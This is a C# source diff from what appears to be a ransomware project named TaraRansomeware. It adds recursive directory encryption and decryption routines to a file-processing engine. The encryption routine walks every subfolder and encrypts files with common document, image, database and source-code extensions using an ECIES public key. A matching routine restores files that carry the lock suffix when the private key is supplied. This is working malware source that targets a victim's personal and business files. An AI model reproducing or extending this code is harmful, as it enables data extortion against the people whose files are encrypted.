@@ -3,10 +3,12 @@ using Org.BouncyCastle.Crypto.Parameters;
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
+using TaraRansomeware.Utilities;
 
-namespace TaraRansomeware
+namespace TaraRansomeware.Engines
 {
-    internal class FileProcessor
+    internal class FileProcessEngine
     {
         /// <summary>
         /// 加密文件的后缀名
@@ -22,9 +24,71 @@ namespace TaraRansomeware
         /// 构造处理器
         /// </summary>
         /// <param name="guid">用户机器的唯一识别码</param>
-        public FileProcessor(byte[] guid)
+        public FileProcessEngine(byte[] guid)
         {
             engine = new EciesCipherEngine(guid);
+        }
+
+        /// <summary>
+        /// 文件夹加密
+        /// </summary>
+        /// <param name="cipPubKey">加密公钥</param>
+        /// <param name="location">文件夹位置</param>
+        public void EncryptDirectory(ECPublicKeyParameters cipPubKey, string location)
+        {
+            var validExtensions = new[]
+            {
+                ".txt", ".md", ".tex", ".rst",
+                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
+                ".jpg", ".png", ".psd",
+                ".csv", ".sql", ".mdb", ".sln",
+                ".php", ".asp", ".aspx", ".html", ".xml", ".py", ".js"
+            };
+
+            string[] files = Directory.GetFiles(location);
+            string[] childDirectories = Directory.GetDirectories(location);
+
+            foreach (string filePath in files)
+            {
+                string extension = Path.GetExtension(filePath);
+                if (validExtensions.Contains(extension))
+                {
+                    Debug.WriteLine(Path.GetFullPath(filePath));
+                    EncryptFile(cipPubKey, Path.GetFullPath(filePath));
+                }
+            }
+
+            foreach (string subDir in childDirectories)
+            {
+                EncryptDirectory(cipPubKey, Path.GetFullPath(subDir));
+            }
+        }
+
+        /// <summary>
+        /// 文件夹解密
+        /// </summary>
+        /// <param name="cipPrivKey">解密私钥</param>
+        /// <param name="location">文件夹位置</param>
+        public void DecryptDirectory(ECPrivateKeyParameters cipPrivKey, string location)
+        {
+            string[] files = Directory.GetFiles(location);
+            string[] childDirectories = Directory.GetDirectories(location);
+            string validExtension = lockSuffix;
+
+            foreach (string filePath in files)
+            {
+                string extension = Path.GetExtension(filePath);
+                if (extension == validExtension)
+                {
+                    Debug.WriteLine(Path.GetFullPath(filePath));
+                    RestoreFile(cipPrivKey, Path.GetFullPath(filePath));
+                }
+            }
+
+            foreach (string subDir in childDirectories)
+            {
+                DecryptDirectory(cipPrivKey, Path.GetFullPath(subDir));
+            }
         }
 
         /// <summary>
